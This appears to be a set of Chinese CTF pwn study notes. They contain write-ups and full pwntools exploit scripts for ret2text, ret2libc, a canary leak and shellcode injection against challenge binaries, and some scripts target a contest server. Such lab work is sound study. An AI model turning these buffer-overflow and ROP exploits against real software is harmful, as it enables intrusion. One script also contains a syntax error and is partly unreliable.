# 小命令

```python
ROPgadget --binary xxx --string '/bin/sh'#查找字符串
ROPgadget --binary xxx --only 'pop|ret' | grep 'rdi'#查找控制寄存器的指令
```

## 找binsh字符串的地址

```python
binsh_addr = next(elf.search(b"/bin/sh"))
```

# 函数

```python
write(1,buf,8)#分别为标准输出，输出的地址，输出的长度（字节）--------rdi rsi rdx
```

# 汇编基础

## 基本指令

```python
.text:000000000000120E                               ; __unwind {
.text:000000000000120E F3 0F 1E FA                   endbr64
.text:0000000000001212 55                            push    rbp
.text:0000000000001213 48 89 E5                      mov     rbp, rsp
.text:0000000000001216 48 83 EC 10                   sub     rsp, 10h
.text:000000000000121A C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0
.text:0000000000001221 83 7D FC 01                   cmp     [rbp+var_4], 1#作比较
.text:0000000000001225 75 11                         jnz     short loc_1238#如果上一次比较不相等就跳转
.text:0000000000001225
.text:0000000000001227 48 8D 3D DA 0D 00 00          lea     rdi, command                    ; "/bin/sh"
.text:000000000000122E B8 00 00 00 00                mov     eax, 0
.text:0000000000001233 E8 58 FE FF FF                call    _system
.text:0000000000001233
```



# 极客大挑战2023--PWN

## ret2text

```python
from pwn import *
#p = process('./ret2text')
p = remote('pwn.node.game.sycsec.com',30867)
#gdb.attach(p)
elf = ELF('./ret2text')
context(os="linux",arch="amd64",log_level='debug')
p.recv()
payload =  b'a'*88 + b'\x27'#因为返回地址和backdoor的高两位相同，所以只用覆盖掉低两位就可以返回到backdoor
p.send(payload)
p.interactive()
```

```python
下面为ida中vuln函数汇编
text:000000000000123B                               ; __unwind {
.text:000000000000123B F3 0F 1E FA                   endbr64
.text:000000000000123F 55                            push    rbp
.text:0000000000001240 48 89 E5                      mov     rbp, rsp
.text:0000000000001243 48 83 EC 50                   sub     rsp, 50h
.text:0000000000001247 48 8D 3D C2 0D 00 00          lea     rdi, s                          ; "The simplest but not too simple pwn"
.text:000000000000124E E8 2D FE FF FF                call    _puts
.text:000000000000124E
.text:0000000000001253 48 8D 45 B0                   lea     rax, [rbp+buf]
.text:0000000000001257 BA 60 00 00 00                mov     edx, 60h ; '`'                  ; nbytes
.text:000000000000125C 48 89 C6                      mov     rsi, rax                        ; buf
.text:000000000000125F BF 00 00 00 00                mov     edi, 0                          ; fd
.text:0000000000001264 B8 00 00 00 00                mov     eax, 0
.text:0000000000001269 E8 32 FE FF FF                call    _read
.text:0000000000001269
.text:000000000000126E 90                            nop
.text:000000000000126F C9                            leave
.text:0000000000001270 C3                            retn
.text:0000000000001270                               ; } // starts at 123B
.text:0000000000001270
.text:0000000000001270                               vuln endp
```

下面为main函数汇编

```python
text:0000000000001271 F3 0F 1E FA                   endbr64
.text:0000000000001275 55                            push    rbp
.text:0000000000001276 48 89 E5                      mov     rbp, rsp
.text:0000000000001279 B8 00 00 00 00                mov     eax, 0
.text:000000000000127E E8 26 FF FF FF                call    init
.text:000000000000127E
.text:0000000000001283 B8 00 00 00 00                mov     eax, 0
.text:0000000000001288 E8 AE FF FF FF                call    vuln
.text:0000000000001288
.text:000000000000128D B8 00 00 00 00                mov     eax, 0#通过vuln的retn，我们会返回到这里
.text:0000000000001292 5D                            pop     rbp
.text:0000000000001293 C3                            retn
.text:0000000000001293                               ; } // starts at 1271
.text:0000000000001293
.text:0000000000001293                               main endp
.text:0000000000001293
.text:0000000000001293                               ; ---------------------
```

```python
backdoor函数的汇编
.text:000000000000120E F3 0F 1E FA                   endbr64
.text:0000000000001212 55                            push    rbp
.text:0000000000001213 48 89 E5                      mov     rbp, rsp
.text:0000000000001216 48 83 EC 10                   sub     rsp, 10h
.text:000000000000121A C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0
.text:0000000000001221 83 7D FC 01                   cmp     [rbp+var_4], 1
.text:0000000000001225 75 11                         jnz     short loc_1238
.text:0000000000001225
.text:0000000000001227 48 8D 3D DA 0D 00 00          lea     rdi, command                    ; "/bin/sh"#我们需要跳转到这里
.text:000000000000122E B8 00 00 00 00                mov     eax, 0
.text:0000000000001233 E8 58 FE FF FF                call    _system
.text:0000000000001233
```

```python
.text:0000000000001227 48 8D 3D DA 0D 00 00          lea     rdi, command                    ; "/bin/sh"
.text:000000000000128D B8 00 00 00 00                mov     eax, 0
```

对比上面两行代码，可以发现call的下一条指令和backdoor只有最后两位不同(27,8D)，所以我们在溢出之后将返回地址最后两位覆盖为\x27就可以返回到backdoor（注：返回地址是从低字节开始覆盖），因为高两位地址都是相同的，为12。故只用更改低两位，使其与backdoor相同。

## ret2libc

题目源码如下：

```python
main函数：
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  write(1, "try this\n", 9uLL);
  vuln();
  write(1, "bye ~", 5uLL);
  return 0;
}
```

```python
vuln函数：
size_t vuln()
{
  size_t result; // rax
  char s[16]; // [rsp+0h] [rbp-10h] BYREF

  write(1, "This challenge no backdoor!", 0x1BuLL);
  gets(s);
  result = strlen(s);
  if ( result > 0x10 )
  {
    write(1, "may you can pass it right?", 0x1AuLL);
    exit(1);
  }
  return result;
}
```


```python
GDB调试：
RAX  0xb
 RBX  0x7fffffffe028 —▸ 0x7fffffffe378 ◂— '/home/tangjunyi/pwn/chal'
 RCX  0x7ffff7fa0a80 (_IO_2_1_stdin_) ◂— 0xfbad208b
*RDX  0x5
 RDI  0x7fffffffdef0 ◂— 'sssssssssss'
 RSI  0x1
 R8   0x0
 R9   0x0
 R10  0x7ffff7ddd360 ◂— 0x10001a000070bc
 R11  0x7ffff7f23dc0 (__strlen_avx2) ◂— mov eax, edi
 R12  0x0
 R13  0x7fffffffe038 —▸ 0x7fffffffe391 ◂— 'COLORFGBG=15;0'
 R14  0x0
 R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
 RBP  0x7fffffffdf10 ◂— 0x1
 RSP  0x7fffffffdf10 ◂— 0x1
*RIP  0x4012ab (main+60) ◂— lea rsi, [rip + 0xd93]
──────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────
   0x401245 <vuln+72>     jbe    vuln+111                      <vuln+111>
    ↓
   0x40126c <vuln+111>    nop    
   0x40126d <vuln+112>    leave  
   0x40126e <vuln+113>    ret    
    ↓
   0x4012a6 <main+55>     mov    edx, 5
 ► 0x4012ab <main+60>     lea    rsi, [rip + 0xd93]
   0x4012b2 <main+67>     mov    edi, 1
   0x4012b7 <main+72>     mov    eax, 0
   0x4012bc <main+77>     call   write@plt                      <write@plt>
 
   0x4012c1 <main+82>     mov    eax, 0
   0x4012c6 <main+87>     pop    rbp
────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffdf10 ◂— 0x1
01:0008│         0x7fffffffdf18 —▸ 0x7ffff7df518a (__libc_start_call_main+122) ◂— mov edi, eax
02:0010│         0x7fffffffdf20 —▸ 0x7fffffffe010 —▸ 0x7fffffffe018 ◂— 0x38 /* '8' */
03:0018│         0x7fffffffdf28 —▸ 0x40126f (main) ◂— endbr64 
04:0020│         0x7fffffffdf30 ◂— 0x100400040 /* '@' */
05:0028│         0x7fffffffdf38 —▸ 0x7fffffffe028 —▸ 0x7fffffffe378 ◂— '/home/tangjunyi/pwn/chal'
06:0030│         0x7fffffffdf40 —▸ 0x7fffffffe028 —▸ 0x7fffffffe378 ◂— '/home/tangjunyi/pwn/chal'
07:0038│         0x7fffffffdf48 ◂— 0x1f77af0f3773e0d9
──────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────
 ► f 0         0x4012ab main+60
   f 1   0x7ffff7df518a __libc_start_call_main+122
   f 2   0x7ffff7df5245 __libc_start_main+133
   f 3         0x4010fe _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 

```

题目思路就是绕过strlen检测，溢出s。泄露write函数的真实地址

溢出了gets之后，查看栈。如果rdx小于8就不能使用csu，上图中rdx的值为0x5，也就是说只能输出五个数字，即并不能输出完整的地址。csu就可以pass掉了。

但是我们在main函数中的write汇编中可以找到这样的代码：

```python
.text:000000000040127C
.text:0000000000401281 48 8D 35 B3 0D 00 00          lea     rsi, aTryThis                   ; "try this\n"
.text:0000000000401288 BA 09 00 00 00                mov     edx, 9                          ; n
.text:000000000040128D BF 01 00 00 00                mov     edi, 1                          ; fd
.text:0000000000401292 B8 00 00 00 00                mov     eax, 0
.text:0000000000401297 E8 E4 FD FF FF                call    _write
.text:0000000000401297
.text:000000000040129C B8 00 00 00 00                mov     eax, 0
.text:00000000004012A1 E8 57 FF FF FF                call    vuln
.text:00000000004012A1
```

可以看出图中的rdx和rdi已经布置好了，即write的第一个和第三个参数不用我们再手动布置了。所以只要布置上方的rsi的地址就可以了，我们需要将write的got表地址传给rsi就可以了。

这时开始寻找gadget：

```python
┌──(root㉿tangjunyi)-[/home/tangjunyi/pwn]
└─# ROPgadget --binary chal  --only 'pop|ret' | grep 'rsi'
0x0000000000401331 : pop rsi ; pop r15 ; ret
```

==可以找到pop rsi的指令，但由于他附带了一个pop r15，这是我们不需要的，所以要将他跳过（把0填入r15进行占位）如下：==

可以构造第一段payload：

```python
payload = b'1\0' + b'a'*22 + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(0x401288)
```

解释一下这段payload，由于strlen会检测s的长度，所以要先进行绕过，\0可以让strlen函数停止检测（1\0占两个字节）。依次把write_got弹出到rsi，把0弹出到r15中占位，将返回地址覆盖为write函数进行输出。至于这里为什么不用lea的0x401281作为返回地址，因为我们在payload中已经将rsi寄存器的值布置好了，==如果跳转到lea，那么刚布置好的数值就会被右边的“try this\n”给覆盖，所以要跳过它，返回到0x401288==

成功输出了write的真实地址后进行接收：

```python
write_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
```

然后算出system和binsh的偏移即可

进行第二次溢出：

```python
payload = b'1\0' + b'a'*22 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system)
```

成功获取flag

完整exp：

```python
from pwn import *
#p = process('./chal')
p= remote('pwn.node.game.sycsec.com',30345)
#gdb.attach(p)
elf = ELF('./chal')
context(os="linux",arch="amd64",log_level='debug')

pop_rdi_ret = 0x401333
pop_rsi_r15_ret = 0x401331
write_got = elf.got['write']

payload = b'1\0' + b'a'*22 + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(0x401288)
p.sendline(payload)
write_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("write_addr = "+hex(write_addr))

libc = ELF('libc.so.6')#这里是打远程使用服务器的libc版本，如果是本地打还需要patch，非常麻烦。所以直接打远程就可以
write_of = libc.symbols['write']
binsh = next(libc.search(b'/bin/sh'))
system_of = libc.symbols['system']
libc_base = write_addr - write_of
system = libc_base + system_of
binsh_addr = binsh + libc_base
print("system"+hex(system))



payload = b'1\0' + b'a'*22 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system)
p.recv()
p.sendline(payload)
p.interactive()

```

# Tron-CTF-PWN

## pwn_01

main函数：

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  dofunc();
  return 0;
}
```

dofunc函数：

```python
int dofunc()
{
  int buf[5]; // [esp+8h] [ebp-14h] BYREF

  buf[0] = 0;
  buf[1] = 0;
  puts("input:");
  read(0, buf, 0x1Cu);
  printf((const char *)buf);
  return 0;
}

```

可以看出是一道栈溢出题，read可以向buf读入0x1c也就是28个字节，而buf的栈空间只有0x14也就是20个字节，看样子似乎是溢出24字节到返回地址，然后覆盖返回地址为backdoor。事实并不是如此，buf的栈空间到底有多大？？？打开我们的gdb，并进入dofunc函数：

```python
  0x804852a <dofunc+72>    lea    eax, [esp + 0x14]
   0x804852e <dofunc+76>    push   eax
   0x804852f <dofunc+77>    call   printf@plt                     <printf@plt>
 
   0x8048534 <dofunc+82>    add    esp, 0x10
   0x8048537 <dofunc+85>    mov    eax, 0
 ► 0x804853c <dofunc+90>    add    esp, 0x18#当gdb运行到这里，即esp+0x18的位置，查看栈空间
   0x804853f <dofunc+93>    pop    ebx
   0x8048540 <dofunc+94>    ret    
    ↓
   0x8048561 <main+32>      mov    eax, 0
   0x8048566 <main+37>      add    esp, 4
   0x8048569 <main+40>      pop    ecx
────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd0c0 —▸ 0xf7fc14a0 —▸ 0xf7d85000 ◂— 0x464c457f
01:0004│     0xffffd0c4 —▸ 0xf7fd98cb (_dl_fixup+235) ◂— mov edi, eax
02:0008│     0xffffd0c8 ◂— 'aaaaaa\n'
03:000c│     0xffffd0cc ◂— 0xa6161 /* 'aa\n' */
04:0010│     0xffffd0d0 —▸ 0xffffd110 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
05:0014│     0xffffd0d4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
06:0018│     0xffffd0d8 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
07:001c│     0xffffd0dc —▸ 0x8048561 (main+32) ◂— mov eax, 0
──────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────
 ► f 0 0x804853c dofunc+90
   f 1 0x8048561 main+32
   f 2 0xf7da8295 __libc_start_call_main+117
   f 3 0xf7da8358 __libc_start_main+136
   f 4 0x80483d2 _start+50
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

输入stack 30查看栈空间(如下图)：

```python
pwndbg> stack 30
00:0000│ esp 0xffffd0c0 —▸ 0xf7fc14a0 —▸ 0xf7d85000 ◂— 0x464c457f#1.这里开始给esp+0x18
01:0004│     0xffffd0c4 —▸ 0xf7fd98cb (_dl_fixup+235) ◂— mov edi, eax
02:0008│     0xffffd0c8 ◂— 'aaaaaa\n'#2.我们刚刚输入的aaaa储存在这里
03:000c│     0xffffd0cc ◂— 0xa6161 /* 'aa\n' */
04:0010│     0xffffd0d0 —▸ 0xffffd110 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
05:0014│     0xffffd0d4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
06:0018│     0xffffd0d8 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c#4.esp+0x18到达这里，所以这里才是ebp
07:001c│     0xffffd0dc —▸ 0x8048561 (main+32) ◂— mov eax, 0#5.那么这里就是真正的返回地址
08:0020│     0xffffd0e0 ◂— 0x1
09:0024│     0xffffd0e4 —▸ 0xffffd100 ◂— 0x1
0a:0028│ ebp 0xffffd0e8 ◂— 0x0
0b:002c│     0xffffd0ec —▸ 0xf7da8295 (__libc_start_call_main+117) ◂— add esp, 0x10#3.通常来说返回地址在这里，即ebp高一位的地方，但是这道题很特殊，他的返回地址并不在这。
0c:0030│     0xffffd0f0 ◂— 0x0
0d:0034│     0xffffd0f4 ◂— 0x70 /* 'p' */
0e:0038│     0xffffd0f8 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x33f14
0f:003c│     0xffffd0fc —▸ 0xf7da8295 (__libc_start_call_main+117) ◂— add esp, 0x10
10:0040│     0xffffd100 ◂— 0x1
11:0044│     0xffffd104 —▸ 0xffffd1b4 —▸ 0xffffd372 ◂— '/home/tangjunyi/pwn/pwn_01'
12:0048│     0xffffd108 —▸ 0xffffd1bc —▸ 0xffffd38d ◂— 'COLORFGBG=15;0'
13:004c│     0xffffd10c —▸ 0xffffd120 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
14:0050│     0xffffd110 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
15:0054│     0xffffd114 —▸ 0x8048541 (main) ◂— lea ecx, [esp + 4]
16:0058│     0xffffd118 ◂— 0x1
17:005c│     0xffffd11c —▸ 0xffffd1b4 —▸ 0xffffd372 ◂— '/home/tangjunyi/pwn/pwn_01'
18:0060│     0xffffd120 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
19:0064│     0xffffd124 —▸ 0x8048580 (__libc_csu_init) ◂— push ebp
1a:0068│     0xffffd128 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
1b:006c│     0xffffd12c ◂— 0x0
1c:0070│     0xffffd130 ◂— 0xefbf1ca9
1d:0074│     0xffffd134 ◂— 0xa519b6b9
pwndbg> 

```

我们再分析一遍dofunc函数的汇编：

```python
text:080484E2 53                            push    ebx
.text:080484E3 83 EC 18                      sub     esp, 18h
.text:080484E6 E8 05 FF FF FF                call    __x86_get_pc_thunk_bx
.text:080484E6
.text:080484EB 81 C3 15 1B 00 00             add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
.text:080484F1 C7 44 24 08 00 00 00 00       mov     [esp+1Ch+buf], 0
.text:080484F9 C7 44 24 0C 00 00 00 00       mov     [esp+1Ch+var_10], 0
.text:08048501 83 EC 0C                      sub     esp, 0Ch
.text:08048504 8D 83 00 E6 FF FF             lea     eax, (aInput - 804A000h)[ebx]   ; "input:"
.text:0804850A 50                            push    eax                             ; s
.text:0804850B E8 50 FE FF FF                call    _puts
.text:0804850B
.text:08048510 83 C4 10                      add     esp, 10h
.text:08048513 83 EC 04                      sub     esp, 4
.text:08048516 6A 1C                         push    1Ch                             ; nbytes
.text:08048518 8D 44 24 10                   lea     eax, [esp+24h+buf]
.text:0804851C 50                            push    eax                             ; buf
.text:0804851D 6A 00                         push    0                               ; fd
.text:0804851F E8 1C FE FF FF                call    _read
.text:0804851F
.text:08048524 83 C4 10                      add     esp, 10h
.text:08048527 83 EC 0C                      sub     esp, 0Ch
.text:0804852A 8D 44 24 14                   lea     eax, [esp+28h+buf]
.text:0804852E 50                            push    eax                             ; format
.text:0804852F E8 1C FE FF FF                call    _printf
.text:0804852F
.text:08048534 83 C4 10                      add     esp, 10h
.text:08048537 B8 00 00 00 00                mov     eax, 0
.text:0804853C 83 C4 18                      add     esp, 18h#在程序准备返回到的时候，他没有将ebp的值赋给esp，即他没有进行leave指令(清空栈帧，使ebp和esp相同)，而是直接将esp加了0x18便开始返回了，也就是他没有用ebp高一位的返回地址，而是提前返回了。而这个提前返回的地址可以通过GDB看出来（计算方法就是将当前esp的地址+0x18，正如这段汇编所描述的过程）
.text:0804853F 5B                            pop     ebx
.text:08048540 C3                            retn
```

将上方esp的地址+0x18得：0xd0c0 + 0x18 = 0xd0d8，这样我们就找到了dofunc真正的ebp，继而就能找到他真正的返回地址：

```python
06:0018│     0xffffd0d8 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c#4.esp+0x18到达这里，所以这里才是ebp
07:001c│     0xffffd0dc —▸ 0x8048561 (main+32) ◂— mov eax, 0#5.那么这里就是真正的返回地址
```

然后我们再算buf的栈空间大小：

```python
02:0008│     0xffffd0c8 ◂— 'aaaaaa\n'#2.我们刚刚输入的aaaa储存在这里
```

即：0xd0d8 - 0xd0c8 = 16

也就是说buf的真实大小为16个字节，那么溢出到返回地址需要16+4=20个字节垃圾数据，可以构造payload：

```python
from pwn import *
p = process('./pwn_01')
#p= remote('pwn.node.game.sycsec.com',30345)
#gdb.attach(p)
elf = ELF('./pwn_01')
context(os="linux",arch="amd64",log_level='debug')
backdoor = 0x80484b6

payload = b'a'*20 + p32(backdoor)
p.recv()
p.sendline(payload)
p.interactive()
```

总结一下这道题，有时候函数并不是一定到了ebp才开始返回，要观察esp的变化，根据esp的加减情况，得出函数何时开始返回（==有时候还未到达ebp时函数便在中途返回==），==所以我们需要重新计算写入数据的地址到真正返回地址的距离，进而得出要溢出的长度。==

backdoor:

```python
int func()
{
  system(sh);
  return 0;
}
对应汇编：
.text:080484B6                               func proc near
.text:080484B6                               ; __unwind {
.text:080484B6 53                            push    ebx
.text:080484B7 83 EC 08                      sub     esp, 8
.text:080484BA E8 B0 00 00 00                call    __x86_get_pc_thunk_ax
.text:080484BA
.text:080484BF 05 41 1B 00 00                add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)
.text:080484C4 83 EC 0C                      sub     esp, 0Ch
.text:080484C7 8D 90 28 00 00 00             lea     edx, (sh - 804A000h)[eax]       ; "/bin/sh"
```



# BUUPWN刷题

## 泄露canary

```python
from pwn import *
p = process('./GuestBook')
#p = remote('xxxxxx',8888)
#gdb.attach(p)
elf = ELF('./GuestBook')
context(os="linux",arch="amd64",log_level='debug')

p.sendafter(b'name',0x19*b'a')#0x18+0x1,覆盖canary最低一位的00
p.recvuntil(0x19*b'a')#返回的为buf中的内容，从垃圾数据结束之后开始接收
data = u64(p.recv(7).rjust(8,b'\x00'))#接收canary的前七个字节，再从右边用00补充到8个字节
data+=1#修改canary最低字节的值为01
print("can"+str(hex(data)))

payload = b'a'*152 + p64(data) + b'a'*8 + p64(0x4012c3)#第一次将canary后面的rbp和返回地址布置好，同时布置canary的前七位
payload1 = b'a'*120 +p64(data-1)#第二次溢出将canary的01还原为00，使其能够通过系统检查

p.sendlineafter(b'leave(MAX 4)',str(2))#循环两次
p.sendline(payload)
p.sendline(payload1)
p.interactive()
```



题目来源：DASCTF（GuestBook）

## 泄露栈地址

```python
from pwn import *
p = process('./GuestBook')
#p = remote('xxxxxx',8888)
#gdb.attach(p)
elf = ELF('./GuestBook')
context(os="linux",arch="amd64",log_level='debug')
p.sendafter(b'name?',16*b'a')#将buf的栈空间填满，留下rbp
p.recvuntil(16*b'a')
data = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))#接收rbp的地址，读取到0x7f时，从数据最后一个元素开始，向左切6个元素（字节），再用0补充到切片结果的左侧，直到切片结果有8个字节（因为8字节地址很难全部都用到，所以基本上都是只使用6个字节
addr = data - 0x80#泄露的是上一个函数的rbp的地址，即main函数的rbp，gdb调试算出vuln()与main()的rbp相差0x10，而vuln()的rbp与v1相差0x70，故用main的rbp地址减去0x70+0x10，得到v1的入口地址
print("addr = "hex(addr))

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x78,b'\x00') + p64(addr)#先向v1写入shellcode，0x70+0x8=0x78,再返回到v1入口去执行shellcode
p.sendafter(b'strong',payload)
```



当前rbp(0x12345)---------------------->栈中数据(0xaababb)；==上一个函数rbp的地址，作为数据被压入栈中，当前函数的rbp寄存器指向它==

